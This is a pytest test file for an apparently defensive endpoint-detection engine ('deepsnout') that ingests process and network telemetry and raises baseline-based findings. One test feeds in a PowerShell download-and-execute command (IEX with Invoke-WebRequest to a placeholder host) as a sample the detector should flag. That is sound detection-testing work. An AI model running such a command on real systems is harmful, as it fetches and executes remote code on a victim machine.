from dataclasses import replace
from sqlalchemy import select
import pytest
from conftest import evt,baseline,CLOCK,DAY,DAY_START,count
from deepsnout.db import (Finding,Coverage,Process,BehaviorDay,Seen,Window,Host,Expectation,set_state,policy,now)
from deepsnout.engine import (ingest,evaluate_windows,maintenance,execution_context,make_finding,host_key,CapacityError,reference)
from deepsnout.demo import fixtures


def test_demo_real_pipeline_and_replay(db):
    records=fixtures(CLOCK)
    assert ingest(db,records,'demo','demo-batch',CLOCK)['accepted']==len(records)
    evaluate_windows(db,CLOCK)
    assert {f.detector for f in db.scalars(select(Finding))}=={'DS-EXEC-001','DS-NET-001'}
    before=sum(db.scalars(select(Coverage.count)))
    assert ingest(db,records,'demo','demo-batch',CLOCK)['batch_replay']
    assert before==sum(db.scalars(select(Coverage.count)))


def test_duplicate_event(db):
    e=evt()
    assert ingest(db,[e,e],clock=CLOCK)['duplicates']==1
    assert ingest(db,[e],clock=CLOCK)['duplicates']==1
    assert count(db,Seen)==1 and db.scalar(select(Coverage.count))==1


def test_hash_churn_stays_same_behavior(db):
    records=baseline(); ingest(db,records,clock=CLOCK)
    newer=evt(Hashes='SHA256='+'b'*64); ingest(db,[newer],clock=CLOCK)
    ctx=db.scalar(select(Process).where(Process.guid==newer.guid)).metadata_json['reference']
    assert ctx['prior_context_days']==8 and not ctx['local_new']
    assert count(db,Finding)==0 and execution_context(records[0])==execution_context(newer)


def test_exact_join_not_time_proximity(db):
    ingest(db,baseline(),clock=CLOCK)
    launch=evt(n=300,Image=r'C:\Users\person\Downloads\new.exe',ts=CLOCK-300)
    ingest(db,[launch,evt(3,n=301,Image=launch.image,ts=CLOCK-200)],clock=CLOCK)
    assert count(db,Finding)==0
    ingest(db,[evt(3,n=300,Image=launch.image,ts=CLOCK-150)],clock=CLOCK)
    f=db.scalar(select(Finding))
    assert f.detector=='DS-EXEC-002' and f.evidence['network']['attribution']=='same endpoint and ProcessGuid'


def test_out_of_order_create_fills_placeholder(db):
    ingest(db,baseline(),clock=CLOCK)
    create=evt(n=300,Image=r'C:\Temp\script.exe',ts=CLOCK-300)
    ingest(db,[evt(3,n=300,Image=create.image,ts=CLOCK-200)],clock=CLOCK)
    assert count(db,Finding)==0
    ingest(db,[create],clock=CLOCK)
    assert db.scalar(select(Finding.detector))=='DS-EXEC-002'


def test_no_network_before_creation_sequence(db):
    ingest(db,baseline(),clock=CLOCK)
    ingest(db,[evt(3,n=300,ts=CLOCK-300),evt(n=300,Image=r'C:\Temp\x.exe',ts=CLOCK-200)],clock=CLOCK)
    assert count(db,Finding)==0


def test_missing_guid_no_invented_correlation(db):
    ingest(db,baseline(),clock=CLOCK)
    report=ingest(db,[evt(Image=r'C:\Temp\x.exe',ProcessGuid=''),evt(3,Image=r'C:\Temp\x.exe',ProcessGuid='')],clock=CLOCK)
    assert report['missing_guid']==2 and count(db,Finding)==0


def test_learning_and_inbound_do_not_create_outbound_lead(db):
    ingest(db,[evt(Image=r'C:\Temp\x.exe',ts=CLOCK-100),evt(3,ts=CLOCK-90)],clock=CLOCK)
    assert count(db,Finding)==0
    ingest(db,baseline(),clock=CLOCK)
    ingest(db,[evt(n=2,Image=r'C:\Temp\y.exe',ts=CLOCK-80),evt(3,n=2,ts=CLOCK-70,Initiated='false')],clock=CLOCK)
    assert count(db,Finding)==0


def test_specific_rule_no_baseline_needed_and_repeat_grouped(db):
    e=evt(Image=r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',CommandLine='IEX (Invoke-WebRequest https://example.invalid/script)')
    ingest(db,[e],clock=CLOCK)
    f=db.scalar(select(Finding)); assert f.detector=='DS-EXEC-001' and f.priority=='high'
    ingest(db,[replace(e,id='different-id',guid='00000000-0000-0000-0000-000000000002')],clock=CLOCK)
    assert count(db,Finding)==1


def test_raw_rare_destinations_no_finding(db):
    events=[evt(22,n=1,ts=CLOCK-400+i,QueryName=f'rare-{i}.example') for i in range(100)]
    ingest(db,events,clock=CLOCK); evaluate_windows(db,CLOCK)
    assert count(db,Finding)==0 and count(db,Window)<=2


def test_change_requires_two_windows(db):
    records=fixtures(CLOCK); high=[e for e in records if e.query.startswith('new-service-')]
    earliest=min(int(e.ts)//1800 for e in high)
    records=[e for e in records if not(e in high and int(e.ts)//1800==earliest)]
    ingest(db,records,'demo',clock=CLOCK); evaluate_windows(db,CLOCK)
    assert 'DS-NET-001' not in set(db.scalars(select(Finding.detector)))


def test_today_excluded_from_history(db):
    ingest(db,[evt(ts=DAY_START+60+i,n=20+i) for i in range(10)],clock=max(CLOCK,DAY_START+3600))
    assert all(p.metadata_json['reference']['prior_observed_days']==0 for p in db.scalars(select(Process)))


def test_retention_does_not_remove_open_evidence(db):
    ingest(db,fixtures(CLOCK),'demo',clock=CLOCK); evaluate_windows(db,CLOCK)
    ids=set(db.scalars(select(Finding.id))); maintenance(db,CLOCK+100*DAY)
    assert set(db.scalars(select(Finding.id)))==ids and count(db,Process)==0 and count(db,Window)==0


def test_old_future_counts(db):
    r=ingest(db,[evt(ts=CLOCK-100*DAY),evt(ts=CLOCK+DAY)],clock=CLOCK)
    assert r['outside_retention']==1 and r['future']==1 and count(db,Seen)==0


def test_context_limit_visible_and_duplicate_overflow_no_crash(db):
    cfg=policy(db); cfg.maximum_contexts_per_host_day=50; set_state(db,'policy',cfg.model_dump())
    records=[evt(n=i+1,Image=f'C:\\Temp\\x{i}.exe') for i in range(51)]
    records.append(evt(n=200,Image='C:\\Temp\\x50.exe'))
    r=ingest(db,records,clock=CLOCK)
    assert r['context_limit']==2 and count(db,BehaviorDay)==50


def test_capacity_rollback(engine):
    from deepsnout.db import transaction
    with transaction(engine) as db:
        cfg=policy(db); cfg.maximum_receipts=10000; set_state(db,'policy',cfg.model_dump())
    with pytest.raises(CapacityError):
        with transaction(engine) as db: ingest(db,[evt()]*10001,clock=CLOCK)
    with transaction(engine) as db: assert count(db,Seen)==0 and count(db,Host)==0


def test_expectations_exact_and_not_specific_rule(db):
    ingest(db,[evt()],clock=CLOCK); host=db.scalar(select(Host))
    db.add(Expectation(host_id=host.id,detector='DS-EXEC-002',context='x',reason='Approved for this host',owner='analyst',expires=now()+DAY)); db.flush()
    assert make_finding(db,host,'DS-EXEC-002','x',CLOCK,'test','test',{}) is None
    assert make_finding(db,host,'DS-EXEC-002','other',CLOCK,'test','test',{}) is not None
    db.add(Expectation(host_id=host.id,detector='DS-EXEC-001',context='x',reason='Should have no effect',owner='analyst',expires=now()+DAY)); db.flush()
    assert make_finding(db,host,'DS-EXEC-001','x',CLOCK,'test','test',{}) is not None


def test_peer_denominator_qualified_by_app_cohort_history(db):
    for host in ['subject','peer','different-cohort','only-one-day']:
        ingest(db,baseline(host,days=1 if host=='only-one-day' else 8),clock=CLOCK)
    for host in db.scalars(select(Host)): host.cohort='office' if host.name!='different-cohort' else 'server'
    db.flush(); subject=db.get(Host,host_key('default','subject')); e=evt(host='subject')
    r=reference(db,subject,execution_context(e),e.app,CLOCK,policy(db))
    assert r['peer_eligible']==1 and r['peer_seen']==1


def test_default_cohort_only_assigns_new_hosts(db):
    ingest(db,[evt()],clock=CLOCK,cohort='office')
    ingest(db,[evt(n=2)],clock=CLOCK,cohort='server')
    assert db.scalar(select(Host.cohort))=='office'


def test_common_peer_context_discount(db):
    cfg=policy(db); cfg.minimum_peer_hosts=3; set_state(db,'policy',cfg.model_dump())
    ingest(db,baseline('subject'),clock=CLOCK,cohort='office')
    for peer in ['peer-a','peer-b','peer-c']:
        events=[evt(host=peer,n=200+d,ts=DAY_START-d*DAY+3600,Image=r'C:\Temp\utility.exe') for d in range(1,9)]
        ingest(db,events,clock=CLOCK,cohort='office')
    ingest(db,[evt(host='subject',n=900,ts=CLOCK-300,Image=r'C:\Temp\utility.exe'),
        evt(3,host='subject',n=900,ts=CLOCK-200,Image=r'C:\Temp\utility.exe')],clock=CLOCK)
    assert count(db,Finding)==0
